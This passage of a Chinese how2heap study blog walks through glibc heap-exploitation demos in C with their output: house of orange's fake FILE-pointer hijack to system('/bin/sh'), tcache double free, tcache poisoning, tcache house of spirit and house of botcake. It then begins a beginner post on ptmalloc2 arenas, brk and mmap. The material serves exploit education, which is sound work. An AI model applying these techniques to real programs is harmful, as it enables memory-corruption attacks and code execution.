Malloc tries to service this request by extending the Top chunk This forces sysmalloc to be invoked. In the usual scenario, the heap looks like the following |------------|------------|------...----| | chunk | chunk | Top ... | |------------|------------|------...----| heap start heap end And the new area that gets allocated is contiguous to the old heap end. So the new size of the Top chunk is the sum of the old size and the newly allocated size. In order to keep track of this change in size, malloc uses a fencepost chunk, which is basically a temporary chunk. After the size of the Top chunk has been updated, this chunk gets freed. In our scenario however, the heap looks like |------------|------------|------..--|--...--|---------| | chunk | chunk | Top .. | ... | new Top | |------------|------------|------..--|--...--|---------| heap start heap end In this situation, the new Top will be starting from an address that is adjacent to the heap end. So the area between the second chunk and the heap end is unused. And the old Top chunk gets freed. Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes, it gets added to list of unsorted bins. Now we request a chunk of size larger than the size of the top chunk. This forces sysmalloc to be invoked. And ultimately invokes _int_free Finally the heap looks like this: |------------|------------|------..--|--...--|---------| | chunk | chunk | free .. | ... | new Top | |------------|------------|------..--|--...--|---------| heap start new heap end */ p2 = malloc(0x1000); /* Note that the above chunk will be allocated in a different page that gets mmapped. It will be placed after the old heap\u0026#39;s end Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins Here starts phase two of the attack. We assume that we have an overflow into the old top chunk so we could overwrite the chunk\u0026#39;s size. For the second phase we utilize this overflow again to overwrite the fd and bk pointer of this chunk in the unsorted bin list. There are two common ways to exploit the current state: - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations) - Use the unlinking of the chunk for an *where*-controlled write of the libc\u0026#39;s main_arena unsorted-bin-list. (requires at least one allocation) The former attack is pretty straight forward to exploit, so we will only elaborate on a variant of the latter, developed by Angelboy in the blog post linked above. The attack is pretty stunning, as it exploits the abort call itself, which is triggered when the libc detects any bogus state of the heap. Whenever abort is triggered, it will flush all the file pointers by calling _IO_flush_all_lockp. Eventually, walking through the linked list in _IO_list_all and calling _IO_OVERFLOW on them. The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose _IO_OVERLOW points to system and whose first 8 bytes are set to \u0026#39;/bin/sh\u0026#39;, so that calling _IO_OVERFLOW(fp, EOF) translates to system(\u0026#39;/bin/sh\u0026#39;). More about file-pointer exploitation can be found here: https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/ The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they currently point to the libc\u0026#39;s main_arena. */ io_list_all = top[2] + 0x9a8; /* We plan to overwrite the fd and bk pointers of the old top, which has now been added to the unsorted bins. When malloc tries to satisfy a request by splitting this free chunk the value at chunk-\u0026gt;bk-\u0026gt;fd gets overwritten with the address of the unsorted-bin-list in libc\u0026#39;s main_arena. Note that this overwrite occurs before the sanity check and therefore, will occur in any case. Here, we require that chunk-\u0026gt;bk-\u0026gt;fd to be the value of _IO_list_all. So, we should set chunk-\u0026gt;bk to be _IO_list_all - 16 */ top[3] = io_list_all - 0x10; /* At the end, the system function will be invoked with the pointer to this file pointer. If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh) */ memcpy((char *) top, \u0026#34;/bin/sh\\x00\u0026#34;, 8); /* The function _IO_flush_all_lockp iterates through the file pointer linked-list in _IO_list_all. Since we can only overwrite this address with main_arena\u0026#39;s unsorted-bin-list, the idea is to get control over the memory at the corresponding fd-ptr. The address of the next file pointer is located at base_address+0x68. This corresponds to smallbin-4, which holds all the smallbins of sizes between 90 and 98. For further information about the libc\u0026#39;s bin organisation see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ Since we overflow the old top chunk, we also control it\u0026#39;s size field. Here it gets a little bit tricky, currently the old top chunk is in the unsortedbin list. For each allocation, malloc tries to serve the chunks in this list first, therefore, iterates over the list. Furthermore, it will sort all non-fitting chunks into the corresponding bins. If we set the size to 0x61 (97) (prev_inuse bit has to be set) and trigger an non fitting smaller allocation, malloc will sort the old chunk into the smallbin-4. Since this bin is currently empty the old top chunk will be the new head, therefore, occupying the smallbin[4] location in the main_arena and eventually representing the fake file pointer\u0026#39;s fd-ptr. In addition to sorting, malloc will also perform certain size checks on them, so after sorting the old top chunk and following the bogus fd pointer to _IO_list_all, it will check the corresponding size field, detect that the size is smaller than MINSIZE \u0026#34;size \u0026lt;= 2 * SIZE_SZ\u0026#34; and finally triggering the abort call that gets our chain rolling. Here is the corresponding code in the libc: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717 */ top[1] = 0x61; /* Now comes the part where we satisfy the constraints on the fake file pointer required by the function _IO_flush_all_lockp and tested here: https://code.woboq.org/userspace/glibc/libio/genops.c.html#813 We want to satisfy the first condition: fp-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base */ _IO_FILE *fp = (_IO_FILE *) top; /* 1. Set mode to 0: fp-\u0026gt;_mode \u0026lt;= 0 */ fp-\u0026gt;_mode = 0; // top+0xc0 /* 2. Set write_base to 2 and write_ptr to 3: fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base */ fp-\u0026gt;_IO_write_base = (char *) 2; // top+0x20 fp-\u0026gt;_IO_write_ptr = (char *) 3; // top+0x28 /* 4) Finally set the jump table to controlled memory and place system there. The jump table pointer is right after the _IO_FILE struct: base_address+sizeof(_IO_FILE) = jump_table 4-a) _IO_OVERFLOW calls the ptr at offset 3: jump_table+0x18 == winner */ size_t *jump_table = \u0026amp;top[12]; // controlled memory jump_table[3] = (size_t) \u0026amp;winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 /* Finally, trigger the whole chain by calling malloc */ malloc(10); /* The libc\u0026#39;s error message will be printed to the screen But you\u0026#39;ll get a shell anyways. */ return 0; } int winner(char *ptr) { system(ptr); return 0; } 输出就没有必要放了。\n先申请了实际大小为 0x400 的 chunk，然后为了满足页对齐以及 top chunk 的 PREV_INUSE 位的条件，通过溢出修改 top chunk 的 size 为 0xc01。此时，如果我们再申请一个 top chunk 大小不能满足的 chunk，就会申请新的 top chunk，而 old top 进入 unsorted bin 中。\n接下来，我们利用 libc 的异常处理程序 getshell。出现异常并终止程序时，会调用 _IO_flush_all_lockp，遍历 _IO_list_all 并对它们依次调用 _IO_OVERFLOW。不难想到，如果伪造 _IO_list_all 指针的前 8 字节为 /bin/sh\\x00，再伪造 _IO_OVERFLOW 为 system，就可以达到目的。其中，_IO_list_all 地址可由已经在 unsorted bin 中的 old top 的 fd 也就是 main_arena+88 推算出来。\n如果我们后续要切割这块 old top 来满足内存申请，那么 old_top-\u0026gt;bk-\u0026gt;fd 会被覆盖为 main_arena+88，这和 unsorted bin attack 涉及的原理是一样的。那么我们希望覆盖 _IO_list_all 为 main_arena+88，只需要令 old_top-\u0026gt;bk = io_list_all-0x10 即可，其中 io_list_all 表示 _IO_list_all 的地址。但问题在于，用于覆盖的值 main_arena+88 不是我们可控的值，因此我们期望能控制其 fd 指针。\n已知下一个文件指针位于文件指针地址 +0x68 处，这恰好对应于 smallbin[4]，存放大小为 90-98 之间的 small chunk。如果我们设置 old top 的大小为 0x61，然后申请一个小块使得 old top 不会被分配出去，那么它就会进入到 smallbin[4] 中，成为链表头，同时也成为了我们伪造的文件指针的 fd 指针。\n然后用 old top 伪造文件指针，满足这几个条件：\n/* 1. Set mode to 0: fp-\u0026gt;_mode \u0026lt;= 0 */ fp-\u0026gt;_mode = 0; // top+0xc0 /* 2. Set write_base to 2 and write_ptr to 3: fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_write_base */ fp-\u0026gt;_IO_write_base = (char *) 2; // top+0x20 fp-\u0026gt;_IO_write_ptr = (char *) 3; // top+0x28 最后，覆盖 _IO_jump_t[3] 也就是 _IO_OVERFLOW 使其指向 winner 函数，或者说 system 函数。\ncalc_tcache_size # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; struct malloc_chunk { size_t mchunk_prev_size; /* Size of previous chunk (if free). */ size_t mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; /* The corresponding word size. */ #define SIZE_SZ (sizeof (size_t)) #define MALLOC_ALIGNMENT (2 * SIZE_SZ \u0026lt; __alignof__ (long double) \\ ? __alignof__ (long double) : 2 * SIZE_SZ) /* The corresponding bit mask value. */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) /* The smallest size we can malloc is an aligned minimal chunk */ #define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \u0026amp; ~MALLOC_ALIGN_MASK)) #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u0026lt;MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026amp; ~MALLOC_ALIGN_MASK) /* When \u0026#34;x\u0026#34; is from chunksize(). */ # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT) /* When \u0026#34;x\u0026#34; is a user-provided size. */ # define usize2tidx(x) csize2tidx (request2size (x)) int main() { unsigned long long req; unsigned long long tidx; fprintf(stderr,\u0026#34;This file doesn\u0026#39;t demonstrate an attack, but calculates the tcache idx for a given chunk size.\\n\u0026#34;); fprintf(stderr,\u0026#34;The basic formula is as follows:\\n\u0026#34;); fprintf(stderr,\u0026#34;\\t(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT\\n\u0026#34;); fprintf(stderr,\u0026#34;\\tOn a 64 bit system the current values are:\\n\u0026#34;); fprintf(stderr,\u0026#34;\\t\\tMINSIZE: 0x%lx\\n\u0026#34;, MINSIZE); fprintf(stderr,\u0026#34;\\t\\tMALLOC_ALIGNMENT: 0x%lx\\n\u0026#34;, MALLOC_ALIGNMENT); fprintf(stderr,\u0026#34;\\tSo we get the following equation:\\n\u0026#34;); fprintf(stderr,\u0026#34;\\t(IDX = CHUNKSIZE - 0x%lx) / 0x%lx\\n\\n\u0026#34;, MINSIZE-MALLOC_ALIGNMENT+1, MALLOC_ALIGNMENT); fprintf(stderr,\u0026#34;BUT be AWARE that CHUNKSIZE is not the x in malloc(x)\\n\u0026#34;); fprintf(stderr,\u0026#34;It is calculated as follows:\\n\u0026#34;); fprintf(stderr,\u0026#34;\\tIF x \u0026lt;MINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)\\n\u0026#34;, MINSIZE, MINSIZE); fprintf(stderr,\u0026#34;\\tELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026amp; ~MALLOC_ALIGN_MASK) \\n\u0026#34;); fprintf(stderr,\u0026#34;\\t=\u0026gt; CHUNKSIZE = (x + 0x%lx + 0x%lx) \u0026amp; ~0x%lx)\\n\\n\\n\u0026#34;, SIZE_SZ, MALLOC_ALIGN_MASK, MALLOC_ALIGN_MASK); while(1) { fprintf(stderr,\u0026#34;[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): \u0026#34;); scanf(\u0026#34;%llx\u0026#34;, \u0026amp;req); tidx = usize2tidx(req); if (tidx\u0026gt; 63) { fprintf(stderr,\u0026#34;\\nWARNING: NOT IN TCACHE RANGE!\\n\u0026#34;); } fprintf(stderr,\u0026#34;\\nTCache Idx: %llu\\n\u0026#34;, tidx); } return 0; } 输出：\nThis file doesn\u0026#39;t demonstrate an attack, but calculates the tcache idx for a given chunk size. The basic formula is as follows: (IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT On a 64 bit system the current values are: MINSIZE: 0x20 MALLOC_ALIGNMENT: 0x10 So we get the following equation: (IDX = CHUNKSIZE - 0x11) / 0x10 BUT be AWARE that CHUNKSIZE is not the x in malloc(x) It is calculated as follows: IF x \u0026lt;MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20) ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026amp; ~MALLOC_ALIGN_MASK) =\u0026gt; CHUNKSIZE = (x + 0x8 + 0xf) \u0026amp; ~0xf) [CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10 TCache Idx: 0 关于 tcache 介绍可以参考 这里。\n这个例子说明了 tcache 的索引是如何分配的，需要注意的是 CHUNKSIZE 是经过 request2size 转化后的大小，也就是 chunk 的实际大小。tcache 索引 IDX 可以由上面的公式得到。\ntcache_dup # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file demonstrates a simple double-free attack with tcache.\\n\u0026#34;); fprintf(stderr,\u0026#34;Allocating buffer.\\n\u0026#34;); int *a = malloc(8); fprintf(stderr,\u0026#34;malloc(8): %p\\n\u0026#34;, a); fprintf(stderr,\u0026#34;Freeing twice...\\n\u0026#34;); free(a); free(a); fprintf(stderr,\u0026#34;Now the free list has [%p, %p].\\n\u0026#34;, a, a); fprintf(stderr,\u0026#34;Next allocated buffers will be same: [%p, %p].\\n\u0026#34;, malloc(8), malloc(8)); return 0; } 输出：\nThis file demonstrates a simple double-free attack with tcache. Allocating buffer. malloc(8): 0x1a90260 Freeing twice... Now the free list has [0x1a90260, 0x1a90260]. Next allocated buffers will be same: [0x1a90260, 0x1a90260]. 和 fastbin 类似，tcache 也存在 double free，而且还没有链表头检查，因此只需要连续两次 free 就好了，更加简单。\ntcache_poisoning # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file demonstrates a simple tcache poisoning attack by tricking malloc into\\n\u0026#34; \u0026#34;returning a pointer to an arbitrary location (in this case, the stack).\\n\u0026#34; \u0026#34;The attack is very similar to fastbin corruption attack.\\n\\n\u0026#34;); size_t stack_var; fprintf(stderr,\u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, (char *)\u0026amp;stack_var); fprintf(stderr,\u0026#34;Allocating 1 buffer.\\n\u0026#34;); intptr_t *a = malloc(128); fprintf(stderr,\u0026#34;malloc(128): %p\\n\u0026#34;, a); fprintf(stderr,\u0026#34;Freeing the buffer...\\n\u0026#34;); free(a); fprintf(stderr,\u0026#34;Now the tcache list has [%p].\\n\u0026#34;, a); fprintf(stderr,\u0026#34;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n\u0026#34; \u0026#34;to point to the location to control (%p).\\n\u0026#34;, sizeof(intptr_t), a, \u0026amp;stack_var); a[0] = (intptr_t)\u0026amp;stack_var; fprintf(stderr,\u0026#34;1st malloc(128): %p\\n\u0026#34;, malloc(128)); fprintf(stderr,\u0026#34;Now the tcache list has [%p].\\n\u0026#34;, \u0026amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr,\u0026#34;2nd malloc(128): %p\\n\u0026#34;, b); fprintf(stderr,\u0026#34;We got the control\\n\u0026#34;); return 0; } 输出：\nThis file demonstrates a simple tcache poisoning attack by tricking malloc into returning a pointer to an arbitrary location (in this case, the stack). The attack is very similar to fastbin corruption attack. The address we want malloc() to return is 0x7ffd4941b420. Allocating 1 buffer. malloc(128): 0x1601260 Freeing the buffer... Now the tcache list has [0x1601260]. We overwrite the first 8 bytes (fd/next pointer) of the data at 0x1601260 to point to the location to control (0x7ffd4941b420). 1st malloc(128): 0x1601260 Now the tcache list has [0x7ffd4941b420]. 2nd malloc(128): 0x7ffd4941b420 We got the control 和 fastbin_dup_into_stack 类似，改写已经 free 掉的 chunk 的 fd 指向栈上地址，然后 malloc 两次即可分配到栈上。\ntcache_house_of_spirit # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file demonstrates the house of spirit attack on tcache.\\n\u0026#34;); fprintf(stderr,\u0026#34;It works in a similar way to original house of spirit but you don\u0026#39;t need to create fake chunk after the fake chunk that will be freed.\\n\u0026#34;); fprintf(stderr,\u0026#34;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk\u0026#39;s size and prev_inuse are sane.\\n\u0026#34;); fprintf(stderr,\u0026#34;(Search for strings \\\u0026#34;invalid next size\\\u0026#34;and \\\u0026#34;double free or corruption\\\u0026#34;)\\n\\n\u0026#34;); fprintf(stderr,\u0026#34;Ok. Let\u0026#39;s start with the example!.\\n\\n\u0026#34;); fprintf(stderr,\u0026#34;Calling malloc() once so that it sets up its memory.\\n\u0026#34;); malloc(1); fprintf(stderr,\u0026#34;Let\u0026#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.\\n\u0026#34;); unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region fprintf(stderr,\u0026#34;This region contains one fake chunk. It\u0026#39;s size field is placed at %p\\n\u0026#34;, \u0026amp;fake_chunks[1]); fprintf(stderr,\u0026#34;This chunk size has to be falling into the tcache category (chunk.size \u0026lt;= 0x410; malloc arg \u0026lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\u0026#34;); fprintf(stderr,\u0026#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\u0026#34;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr,\u0026#34;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\u0026#34;, \u0026amp;fake_chunks[1]); fprintf(stderr,\u0026#34;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\u0026#34;); a = \u0026amp;fake_chunks[2]; fprintf(stderr,\u0026#34;Freeing the overwritten pointer.\\n\u0026#34;); free(a); fprintf(stderr,\u0026#34;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\u0026#34;, \u0026amp;fake_chunks[1], \u0026amp;fake_chunks[2]); fprintf(stderr,\u0026#34;malloc(0x30): %p\\n\u0026#34;, malloc(0x30)); } 输出：\nThis file demonstrates the house of spirit attack on tcache. It works in a similar way to original house of spirit but you don\u0026#39;t need to create fake chunk after the fake chunk that will be freed. You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk\u0026#39;s size and prev_inuse are sane. (Search for strings\u0026#34;invalid next size\u0026#34;and\u0026#34;double free or corruption\u0026#34;) Ok. Let\u0026#39;s start with the example!. Calling malloc() once so that it sets up its memory. Let\u0026#39;s imagine we will overwrite 1 pointer to point to a fake chunk region. This region contains one fake chunk. It\u0026#39;s size field is placed at 0x7ffe46748fb8 This chunk size has to be falling into the tcache category (chunk.size \u0026lt;= 0x410; malloc arg \u0026lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe46748fb8. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, which will be 0x7ffe46748fc0! malloc(0x30): 0x7ffe46748fc0 依然非常简单。相比传统 house of spirit，tcache 中不会检查被释放的 chunk 的下一个 chunk 的 chunk_size 字段。那么我们只要保证 fake chunk 本身的大小合法（实际上就是位于 small bin 范围内）就可以了。随后将 fake chunk 的 mem 指针赋值给 a，free(a) 就将 fake chunk 放进了 tcache，再次 malloc 即可拿到 fake chunk。\nhouse_of_botcake # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { /* * This attack should bypass the restriction introduced in * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d * If the libc does not include the restriction, you can simply double free the victim and do a * simple tcache poisoning */ // disable buffering and make _FILE_IO does not interfere with our heap setbuf(stdin, NULL); setbuf(stdout, NULL); // introduction puts(\u0026#34;This file demonstrates a powerful tcache poisoning attack by tricking malloc into\u0026#34;); puts(\u0026#34;returning a pointer to an arbitrary location (in this demo, the stack).\u0026#34;); puts(\u0026#34;This attack only relies on double free.\\n\u0026#34;); // prepare the target intptr_t stack_var[4]; puts(\u0026#34;The address we want malloc() to return, namely,\u0026#34;); printf(\u0026#34;the target address is %p.\\n\\n\u0026#34;, stack_var); // prepare heap layout puts(\u0026#34;Preparing heap layout\u0026#34;); puts(\u0026#34;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.\u0026#34;); intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); // cause chunk overlapping puts(\u0026#34;Now we are able to cause chunk overlapping\u0026#34;); puts(\u0026#34;Step 1: fill up tcache list\u0026#34;); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } puts(\u0026#34;Step 2: free the victim chunk so it will be added to unsorted bin\u0026#34;); free(a); puts(\u0026#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.\u0026#34;); free(prev); puts(\u0026#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\u0026#34;); malloc(0x100); /*VULNERABILITY*/ free(a);// a is already freed /*VULNERABILITY*/ // simple tcache poisoning puts(\u0026#34;Launch tcache poisoning\u0026#34;); puts(\u0026#34;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk\u0026#34;); intptr_t *b = malloc(0x120); puts(\u0026#34;We simply overwrite victim\u0026#39;s fwd pointer\u0026#34;); b[0x120/8-2] = (long)stack_var; // take target out puts(\u0026#34;Now we can cash out the target chunk.\u0026#34;); malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); printf(\u0026#34;Got control on target/stack!\\n\\n\u0026#34;); // note puts(\u0026#34;Note:\u0026#34;); puts(\u0026#34;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim\u0026#34;); puts(\u0026#34;In that case, once you have done this exploitation, you can have many arbitary writes very easily.\u0026#34;); return 0; } 输出：\nThis file demonstrates a powerful tcache poisoning attack by tricking malloc into returning a pointer to an arbitrary location (in this demo, the stack). This attack only relies on double free. The address we want malloc() to return, namely, the target address is 0x7ffd2845e850. Preparing heap layout Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later. Allocating a chunk for later consolidation Allocating the victim chunk. malloc(0x100): a=0xcffae0. Allocating a padding to prevent consolidation. Now we are able to cause chunk overlapping Step 1: fill up tcache list Step 2: free the victim chunk so it will be added to unsorted bin Step 3: free the previous chunk and make it consolidate with the victim chunk. Step 4: add the victim chunk to tcache list by taking one out from it and free victim again Launch tcache poisoning Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk We simply overwrite victim\u0026#39;s fwd pointer Now we can cash out the target chunk. The new chunk is at 0x7ffd2845e850 Got control on target/stack! Note: And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim In that case, once you have done this exploitation, you can have many arbitary writes very easily. 首先用 7 个 0x100 的 chunk 填满 tcache，再次申请 0x100 的 chunk a 并释放就只能进入 unsorted bin。如果它上一个 chunk 同样是 0x100 并且也被释放，那么它们就会合并。\n现在从 tcache 中取出一个 chunk，然后 double free 掉 a，a 就进入了 tcache。然后我们申请一个大于 0x100 的 chunk 使得 tcache 无法满足申请，从而从 unsorted bin 中取出刚才合并好的 chunk，构成堆块重叠，修改 a 的 fd 为栈上地址，malloc 两次即可分配到栈上。\n","date":"2019-12-09","permalink":"/posts/how2heap/","section":"Posts","summary":"\u003cp\u003e距离文章发布两个多月后，终于更新完啦！\u003c/p\u003e","title":"how2heap 学习"},{"content":"The heap is a beautiful mess.\n本文将对 Glibc 堆上的内存管理作简要介绍，部分内容翻译自参考资料中的文章。略过了许多细节，主要是为了对新手友好。\n默认读者熟悉操作系统、C 语言及其运行机制，并且对于 C 中的函数调用栈有所了解。\n什么是堆？ # 堆是每个程序被分配到的一块内存区域，和栈的区别主要在于堆内存是动态分配的。也就是说，程序可以从 heap 段请求一块内存，或者释放一块内存。\n另外，堆内存是全局的，即在程序的任意位置都可以访问到堆，并不一定要在调用 malloc 的那个函数里访问。这是因为 C 语言使用指针指向动态分配的内存。但相比访问栈上的静态局部变量，使用指针也带来了一定的开销。\n使用动态分配的内存 # GLibc 采用 ptmalloc2 内存分配器管理堆内存，相比前身 dlmalloc，它增加了对多线程的支持。多线程的好处就不多赘述了。\n借助 stdlib.h 我们可以使用 malloc 和 free 函数来操作堆内存：\nchar *buffer = (char *)malloc(10); strcpy(buffer,\u0026#34;hello\u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, buffer); free(buffer); 第一行分配了 10 字节给 buffer，注意这里的强制类型转换是必须的；第 2-3 行使用了 buffer 这块内存，并在最后一行释放。\n下面是 malloc 和 free 函数的注释：\n/* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ 注意，即使申请 0 字节内存，malloc 依然会分配一个最小的 chunk；如果传给 free 的参数是空指针，free 不会做任何事，而如果传入的是一个已经 free 过的指针，那么后果是不可预期的。这里尤其需要注意的是，与 Java 等语言不同，C 语言中释放掉分配到的内存的责任在于程序员，并且分配到的内存只应使用一次。\n这两个函数在更底层上是使用 brk() 和 mmap() 这两个系统调用来管理内存的。\n两个系统调用 # 注意申请内存时，Linux 内核只会先分配一段虚拟内存，真正使用时才会映射到物理内存上去。\nbrk() # brk() 通过增加 break location 来获取内存，一开始 heap 段的起点 start_brk 和 heap 段的终点 brk 指向同一个位置。\nASLR 关闭时，两者指向 data/bss 段的末尾，也就是 end_data ASLR 开启时，两者指向 data/bss 段的末尾加上一段随机 brk 偏移 注：注意与 sbrk() 的区别，后者是 C 语言库函数，malloc 源码中的 MORECORE 就是调用的 sbrk()。\nmmap() # 用于创建私有的匿名映射段，主要是为了分配一块新的内存，且这块内存只有调用 mmap() 的进程可以使用，所以称之为私有的。与之进行相反操作的是 munmap()，删除一块内存区域上的映射。\n多线程与 Arena # 前面提到，ptmalloc2 的一大改进就在于多线程，那么他是如何做到的呢？不难猜到，每个线程必定要维护一些独立的数据结构，并且对这些数据结构的访问是需要加锁的。的确，在 ptmalloc2 中，每个线程拥有自己的 freelist，也就是维护空闲内存的一个链表；以及自己的 arena，一段连续的堆内存区域。特别地，主线程的 arena 叫做 main_arena。注意只有 main_arena 可以访问 heap 段和 mmap 映射区域，non_main_arena 只能访问 mmap 映射区域。\n注：线程较多时，互斥锁机制会导致性能下降。\n当我们在程序中第一次申请内存时还没有 heap 段，因此 132KB 的 heap 段，也就是我们的 main_arena，会被创建（通过 brk()调用），无论我们申请的内存是多大。对于接下来的内存申请，malloc 都会从 main_arena 中尝试取出一块内存进行分配。如果空间不够，main_arena 可以通过 brk() 扩张；如果空闲空间太多，也可以缩小。\n那么对于 non_main_arena 呢？前面提到它只能访问 mmap 映射区域，因为在创建时它就是由 mmap() 创建的——1MB 的内存空间会被映射到进程地址空间，不过实际上只有 132KB 是可读写的，这 132KB 就是该线程的 heap 结构，或者叫 non_main_arena。\n注：当然了，当申请的空间大于 128KB 且 arena 中没有足够空间时，无论在哪个 arena 里都只能通过 mmap() 分配内存。\narena 也不是和线程一对一的，实际上有数量限制：\nFor 32 bit systems: Number of arena = 2 * number of cores. For 64 bit systems: Number of arena = 8 * number of cores. 而当我们 free 一小块内存时，内存也不会直接归还给内核，而是给 ptmalloc2 让他去维护，后者会将空闲内存丢入 bin 中，或者说 freelist 中也可以。如果过了一会我们的程序又要申请内存，那么 ptmalloc2 就会从 bin 中找一块空闲的内存进行分配，找不到的话才会去问内核要内存。\n维护多个堆 # 前面提到，main_arena 只有一个堆，并且可以灵活地放缩；non_main_arena 则只能通过 mmap() 获得一个堆。那么如果 non_main_arena 里分配的堆内存不够了怎么办？很简单，再 mmap() 一次，创建一个新的堆。\n所以，在 non_main_arena 